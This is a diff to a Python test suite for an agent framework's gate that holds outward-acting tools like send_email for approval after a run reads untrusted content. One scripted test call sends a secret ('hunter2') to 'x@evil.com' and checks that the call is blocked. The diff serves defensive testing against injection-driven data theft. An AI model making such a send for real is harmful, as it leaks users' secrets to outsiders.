@@ -123,6 +123,9 @@ def _agent(
     )
 
 
+_TOOL_CALL = 'tool_bridge.tool_call'
+"""`ToolBridge`'s `tool_call` kind, as its parts record it."""
+
 _SEND: tuple[str, Mapping[str, object]] = ('send_email', {'to': 'it-support@acme.co', 'body': 'hunter2'})
 _READ: tuple[str, Mapping[str, object]] = ('read_email', {})
 
@@ -524,7 +527,9 @@ class TestArgsValidator:
     """A tool's own `args_validator` can ask during validation, before any execute hook, so the gate asks there."""
 
     @staticmethod
-    def _agent(mailbox: _Mailbox, model: FunctionModel) -> Agent[None, str | DeferredToolRequests]:
+    def _agent(
+        mailbox: _Mailbox, model: FunctionModel, *extra: AbstractCapability[None]
+    ) -> Agent[None, str | DeferredToolRequests]:
         def ask_outside(ctx: RunContext[None], to: str, body: str) -> None:
             if not to.endswith('@acme.co') and not ctx.tool_call_approved:
                 raise ApprovalRequired(metadata={'reason': 'Mail leaves the company.'})
@@ -535,8 +540,28 @@ class TestArgsValidator:
             return 'sent'
 
         return _agent(
-            model, mailbox, UntrustedContentGate(), Capability[None](tools=[Tool(forward, args_validator=ask_outside)])
+            model,
+            mailbox,
+            *extra,
+            UntrustedContentGate(),
+            Capability[None](tools=[Tool(forward, args_validator=ask_outside)]),
         )
+
+    async def test_the_gates_request_stands_in_for_a_permissions_rule_on_the_same_validated_call(self) -> None:
+        """The gate asks during validation, before `Permissions` would ask in `before_tool_execute`.
+
+        Until approval requests share one reason list (#14593), the gate's request covers the rule's ask too,
+        and the rule's reason is not in it.
+        """
+        mailbox = _Mailbox([], [])
+        rule = PermissionRule[None](tools=['forward'], verdict='ask', reason='Mail leaves the company.')
+        forward = ('forward', {'to': 'it-support@acme.co', 'body': 'hunter2'})
+        agent = self._agent(mailbox, _script([_READ], [forward]), Permissions[None](rules=[rule]))
+
+        result = await agent.run('go')
+
+        assert list(_requests(result.output).metadata['call1-0']) == ['untrusted_content_gate']
+        assert mailbox.sent == []
 
     async def test_the_gate_asks_about_a_call_its_validator_would_ask_about(self) -> None:
         mailbox = _Mailbox([], [])
@@ -1012,6 +1037,58 @@ class TestUntrustedContentGateWithToolBridge:
             {'tool_name': 'read_email', 'tool_call_id': 'call0-0'}
         ]
 
+    @pytest.mark.parametrize(
+        ('read', 'bridged'),
+        [
+            (('tool_call', {'name': 'read_notes', 'args_json': '{}'}), ['read_notes', 'send_email']),
+            (('read_notes', dict[str, object]()), ['send_email']),
+        ],
+        ids=['bridged-read', 'native-read'],
+    )
+    async def test_a_bridged_send_after_a_trusted_read_runs(
+        self, read: tuple[str, Mapping[str, object]], bridged: list[str]
+    ) -> None:
+        mailbox = _Mailbox([], [])
+        send = ('tool_call', {'name': 'send_email', 'args_json': '{"to": "it-support@acme.co", "body": "hunter2"}'})
+        agent = _agent(
+            _script([read], [send]),
+            mailbox,
+            ToolBridge(tools=bridged),
+            UntrustedContentGate(trusted_tools=['read_notes']),
+        )
+
+        await agent.run('go')
+
+        assert mailbox.sent == ['it-support@acme.co: hunter2']
+
+    async def test_a_bridged_send_after_an_untrusted_bridged_read_names_the_read(self) -> None:
+        reasons: list[str | None] = []
+
+        async def deny(ctx: RunContext[None], requests: DeferredToolRequests) -> DeferredToolResults:
+            reasons.extend(untrusted_content_reason(requests.metadata.get(c.tool_call_id)) for c in requests.approvals)
+            return DeferredToolResults(approvals={call.tool_call_id: ToolDenied() for call in requests.approvals})
+
+        mailbox = _Mailbox([], [])
+        read = ('tool_call', {'name': 'read_email', 'args_json': '{}'})
+        send = ('tool_call', {'name': 'send_email', 'args_json': '{"to": "x@evil.com", "body": "hunter2"}'})
+        agent = _agent(
+            _script([read], [send]),
+            mailbox,
+            ToolBridge(tools=['read_email', 'send_email']),
+            UntrustedContentGate(),
+            HandleDeferredToolCalls[None](deny),
+        )
+
+        await agent.run('go')
+
+        assert reasons == snapshot(
+            [
+                'This run has read content from outside sources (`read_email`), and `send_email` can act outside the '
+                'run, so it waits for approval.'
+            ]
+        )
+        assert mailbox.sent == []
+
     async def test_a_trusted_read_through_the_bridge_in_an_earlier_run_taints(self) -> None:
         """Only the run that made the bridged call knows which tool it was, so history from before counts as untrusted."""
         mailbox = _Mailbox([], [])
@@ -1029,8 +1106,8 @@ class TestUntrustedContentGateWithToolBridge:
     async def test_a_tool_call_result_whose_call_names_no_tool_taints(self) -> None:
         history: list[ModelMessage] = [
             ModelRequest(parts=[UserPromptPart('read')]),
-            ModelResponse(parts=[ToolCallPart('tool_call', {}, tool_call_id='old')]),
-            ModelRequest(parts=[ToolReturnPart('tool_call', 'notes', tool_call_id='old')]),
+            ModelResponse(parts=[ToolCallPart('tool_call', {}, tool_call_id='old', tool_kind=_TOOL_CALL)]),
+            ModelRequest(parts=[ToolReturnPart('tool_call', 'notes', tool_call_id='old', tool_kind=_TOOL_CALL)]),
             ModelResponse(parts=[TextPart('read it')]),
         ]
         agent = _agent(
